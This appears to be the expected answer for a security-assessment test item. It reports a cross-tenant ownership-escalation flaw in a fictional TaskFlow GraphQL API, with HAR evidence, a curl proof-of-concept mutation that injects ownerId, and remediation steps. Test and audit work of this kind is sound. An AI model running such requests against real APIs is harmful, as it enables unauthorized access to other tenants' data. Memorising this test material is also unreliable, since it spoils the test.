# Expected Response

## System
- Domain: SaaS / Project Management
- System: TaskFlow Collaboration API
- Example ID: GQL-0110

## Priority Findings

### Finding 1: SaaS Project Management — Draft Project Access via Ownership Escalation (Pattern 10.5)
**Severity:** High
**Category:** Single-User / Draft / Non-Published Resource Access

**Summary:**
Per §4.0 RISK-GQL-110 and §5.0 (Pattern 10.5 — draft/non-published resource access): The `getProject` resolver fetches by `projectId` only without enforcing ownership, while the `updateProject` mutation accepts a client-supplied `ownerId` field. An attacker from `tenant-e31e` mutated `updateProject(id: "P-2110", input: {status: "approved", ownerId: "attacker-e31e20bf"})` against a draft project belonging to `tenant-20bf`, gaining access to unpublished project data including `CONFIDENTIAL-e31e20bf`. In SaaS Project Management, this exposes unreleased roadmap, confidential project scopes, and draft configurations.

**Evidence from HAR:**
- Request: `POST https://api.taskflow-collaborati.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-e31e`
- Mutation: `updateProject(id: "P-2110", input: {status: "approved", ownerId: "attacker-e31e20bf"}) { projectId status }`
- Response `200 OK`: `tenantId: "tenant-20bf"`, `ownerId: "other-user-e31e20bf"`, `sensitiveField: "CONFIDENTIAL-e31e20bf"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-e31e20bf`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-110 | getProject resolver, no ownership enforcement |
| HAR request | input.ownerId | attacker-e31e20bf (client-injected) |
| HAR response | tenantId | tenant-20bf cross-tenant data returned |
| HAR response | sensitiveField | CONFIDENTIAL-e31e20bf |

## Steps to Reproduce

### Step 1 — updateProject with ownership escalation (HAR)
```bash
curl -s -X POST https://api.taskflow-collaborati.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e31e" \
  -d '{"query": "mutation { updateProject(id: \"P-2110\", input: {status: \"approved\", ownerId: \"attacker-e31e20bf\"}) { projectId status } }"}'
```
**Vulnerable:** `tenant-20bf` draft project accessed and mutated. **Secure:** FORBIDDEN.

## Remediation
1. Strip `ownerId` from `ProjectInput`; set server-side from `$jwt.userId`.
2. Resolver: `WHERE project_id=$id AND tenant_id=$jwt.tenantId`.
3. Draft-state gate: check `status != "published"` requires owner role.
4. Redis cache key: `project:{tenantId}:{projectId}`.
